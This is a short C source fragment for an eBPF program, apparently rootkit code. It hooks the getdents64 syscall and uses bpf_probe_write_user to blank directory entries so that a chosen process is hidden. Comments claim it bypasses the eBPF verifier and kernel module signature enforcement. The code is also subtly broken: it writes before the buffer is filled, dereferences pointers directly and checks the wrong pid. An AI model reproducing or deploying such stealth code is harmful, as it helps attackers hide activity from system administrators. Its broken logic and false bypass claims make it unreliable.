// Bypass eBPF verifier using global variables
volatile const u32 target_pid = 0;

SEC("tracepoint/syscalls/sys_enter_getdents64")
int hide_process(struct trace_event_raw_sys_enter* ctx) {
	struct task_struct *task = (struct task_struct *)bpf_get_current_task();
	u32 pid = task->pid;
	
	if (pid == target_pid) {
		// Manipulate directory entries
		struct linux_dirent64 *dir = (struct linux_dirent64 *)ctx->args[1];
		bpf_probe_write_user(dir->d_name, "\0", 1); 
	}
	return 0;
}

// Bypass kernel module signature enforcement
char _license[] SEC("license") = "GPL";